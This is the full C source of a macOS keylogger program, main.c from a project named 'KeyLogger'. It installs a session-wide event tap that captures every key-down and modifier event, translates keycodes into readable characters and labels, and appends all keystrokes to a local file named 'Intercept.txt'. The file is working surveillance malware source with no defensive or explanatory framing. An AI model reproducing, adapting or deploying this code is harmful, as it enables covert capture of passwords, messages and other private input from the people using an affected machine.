//
//  main.c
//  KeyLogger
//
//  Created by Ryan Appel on 2/9/21.
//

#include <stdio.h>
#include <time.h>
#include <string.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

char* keys[127];
CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* refcon);
void setupKeycodes(void);

FILE* fd;

int main(int argc, const char * argv[]) {
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
    CFMachPortRef eventTap = CGEventTapCreate( kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL);

    if (!eventTap) {
        fprintf(stderr, "ERROR: unable to create event tap. \n");
        return 1;
    }
    setupKeycodes();

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    fd = fopen("Intercept.txt", "w+");
    if (!fd) {
        fprintf(stderr, "Unable to open logfile.\n");
    }

    printf("Ready\n");
    fflush(stdout);
    CFRunLoopRun();
    fclose(fd);

    return 0;
}

CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* refcon) {
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) {
        return event;
    }

    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    fprintf(fd, "%s", keys[keyCode]);
    fflush(fd);
    return event;
}

void setupKeycodes() {
    keys[0] = "a";
    keys[1] = "s";
    keys[2] = "d";
    keys[3] = "f";
    keys[4] = "h";
    keys[5] = "g";
    keys[6] = "z";
    keys[7] = "x";
    keys[8] = "c";
    keys[9] = "v";
    keys[10] = "";
    keys[11] = "b";
    keys[12] = "q";
    keys[13] = "w";
    keys[14] = "e";
    keys[15] = "r";
    keys[16] = "y";
    keys[17] = "t";
    keys[18] = "1";
    keys[19] = "2";
    keys[20] = "3";
    keys[21] = "4";
    keys[22] = "6";
    keys[23] = "5";
    keys[24] = "=";
    keys[25] = "9";
    keys[26] = "7";
    keys[27] = "-";
    keys[28] = "8";
    keys[29] = "0";
    keys[30] = "]";
    keys[31] = "o";
    keys[32] = "u";
    keys[33] = "[";
    keys[34] = "i";
    keys[35] = "p";
    keys[36] = "<RETURN>";
    keys[37] = "l";
    keys[38] = "j";
    keys[39] = "'";
    keys[40] = "k";
    keys[41] = ";";
    keys[42] = "\\";
    keys[43] = ",";
    keys[44] = "/";
    keys[45] = "n";
    keys[46] = "m";
    keys[47] = ".";
    keys[48] = "<TAB>";
    keys[49] = " ";
    keys[50] = "`";
    keys[51] = "<DEL>";
    keys[52] = "";
    keys[53] = "<ESC>";
    keys[54] = "<R CMD>";
    keys[55] = "<L CMD>";
    keys[56] = "<L SHIFT>";
    keys[57] = "<CAPS LOCK>";
    keys[58] = "<L OPT>";
    keys[59] = "<L CTRL>";
    keys[60] = "<R SHIFT>";
    keys[61] = "<R OPT>";
    keys[62] = "<R CTRL>";
    keys[63] = "<FN>";
    keys[64] = "<F17>";
    keys[65] = ".";
    keys[66] = "";
    keys[67] = "*";
    keys[68] = "";
    keys[69] = "+";
    keys[70] = "";
    keys[71] = "<CLEAR>";
    keys[72] = "<VOL UP>";
    keys[73] = "<VOL DOWN>";
    keys[74] = "<MUTE>";
    keys[75] = "/";
    keys[76] = "<ENTER>";
    keys[77] = "";
    keys[78] = "-";
    keys[79] = "<F18>";
    keys[80] = "<F19>";
    keys[81] = "=";
    keys[82] = "0";
    keys[83] = "1";
    keys[84] = "2";
    keys[85] = "3";
    keys[86] = "4";
    keys[87] = "5";
    keys[88] = "6";
    keys[89] = "7";
    keys[90] = "<F20>";
    keys[91] = "8";
    keys[92] = "9";
    keys[93] = "";
    keys[94] = "";
    keys[95] = "";
    keys[96] = "<F5>";
    keys[97] = "<F6>";
    keys[98] = "<F7>";
    keys[99] = "<F3>";
    keys[100] = "<F8>";
    keys[101] = "<F9>";
    keys[102] = "";
    keys[103] = "<F11>";
    keys[104] = "";
    keys[105] = "<F13>";
    keys[106] = "<F16>";
    keys[107] = "<F14>";
    keys[108] = "";
    keys[109] = "<F10>";
    keys[110] = "";
    keys[111] = "<F12>";
    keys[112] = "";
    keys[113] = "<F15>";
    keys[114] = "<HELP>";
    keys[115] = "<HOME>";
    keys[116] = "<PG UP>";
    keys[117] = "<FWDDEL>";
    keys[118] = "<F4>";
    keys[119] = "<END>";
    keys[120] = "<F2>";
    keys[121] = "<PG DOWN>";
    keys[122] = "<F1>";
    keys[123] = "<LEFT>";
    keys[124] = "<RIGHT>";
    keys[125] = "<DOWN>";
    keys[126] = "<UP>";
}
